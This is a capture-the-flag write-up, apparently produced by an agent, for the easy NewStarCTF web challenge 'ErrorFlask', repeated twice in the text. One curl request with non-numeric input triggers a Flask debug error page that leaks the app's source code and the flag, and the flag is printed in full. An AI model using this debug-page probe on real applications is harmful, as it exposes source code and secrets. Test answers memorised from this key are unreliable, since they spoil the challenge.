---
# ErrorFlask

## Summary

A Flask web application running in debug mode. By triggering a ValueError with invalid input, the Werkzeug debugger reveals the source code containing the flag.

## Solution

### Step 1: Trigger Flask Debug Error Page

The application expects two numeric parameters (`number1` and `number2`). Sending a non-numeric value triggers an exception, which Flask's debug mode displays with full source code context.

```bash
curl -s "http://TARGET/?number1=abc&number2=2"
```

The error page shows the source code around the error location:

```python
flag = "flag{Y0u_@re_3enset1ve_4bout_deb8g}"
num1 = request.args.get("number1");
num2 = request.args.get("number2");
if not num1:
    return "give me number1 and number2,i will help you to add"
return "not ssti,flag in source code~"+str(int(num1)+int(num2))
```

## Flag

```
flag{Y0u_@re_3enset1ve_4bout_deb8g}
```---
title: "ErrorFlask"
ctf: "NewStarCTF 2023 公开赛道"
date: 2026-05-25
category: web
difficulty: easy
points: N/A
flag_format: "flag{...}"
author: "CTF Agent"
---

# ErrorFlask

## Summary

A Flask web application running in debug mode. By triggering a ValueError with invalid input, the Werkzeug debugger reveals the source code containing the flag.

## Solution

### Step 1: Trigger Flask Debug Error Page

The application expects two numeric parameters (`number1` and `number2`). Sending a non-numeric value triggers an exception, which Flask's debug mode displays with full source code context.

```bash
curl -s "http://TARGET/?number1=abc&number2=2"
```

The error page shows the source code around the error location:

```python
flag = "flag{Y0u_@re_3enset1ve_4bout_deb8g}"
num1 = request.args.get("number1");
num2 = request.args.get("number2");
if not num1:
    return "give me number1 and number2,i will help you to add"
return "not ssti,flag in source code~"+str(int(num1)+int(num2))
```

## Flag

```
flag{Y0u_@re_3enset1ve_4bout_deb8g}
```